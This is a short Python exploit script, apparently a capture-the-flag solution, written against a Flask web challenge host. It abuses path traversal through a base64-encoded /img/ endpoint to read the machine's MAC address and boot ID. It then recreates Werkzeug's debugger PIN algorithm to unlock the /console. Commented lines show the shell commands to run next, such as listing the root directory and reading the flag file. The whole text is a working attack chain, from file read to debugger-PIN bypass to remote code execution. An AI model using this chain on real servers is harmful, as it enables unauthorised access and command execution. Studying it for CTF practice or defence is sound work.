
import requests
from urllib3.exceptions import InsecureRequestWarning
from base64 import b64encode
import hashlib
from itertools import chain

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = 'http://dev.vincent55.tw:33001'

def get_file(path):
    path = b64encode(path.encode()).decode()
    r = requests.get(url+f'/img/{path}', verify=False)
    return r.content

node_uuid = str(int(get_file('../../../../../../../sys/class/net/eth0/address').decode().replace(":", ""), 16))
machine_id = get_file('../../../../../../../proc/sys/kernel/random/boot_id').strip()

print(node_uuid)
print(machine_id)
probably_public_bits = [
	'daemon', # username of the user running flask
	'flask.app', # modname of app.py
	'Flask', # name of the Flask class
	'/usr/local/lib/python3.10/site-packages/flask/app.py', # location of app.py (flask module)
]

private_bits = [
	node_uuid,
	machine_id
]

num = None
rv = None

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(f"PIN: {rv}\nTo {url}/console and paste it.")

# import subprocess
# subprocess.check_output("ls /", shell=True)
# subprocess.check_output("cat /{flag_name}", shell=True)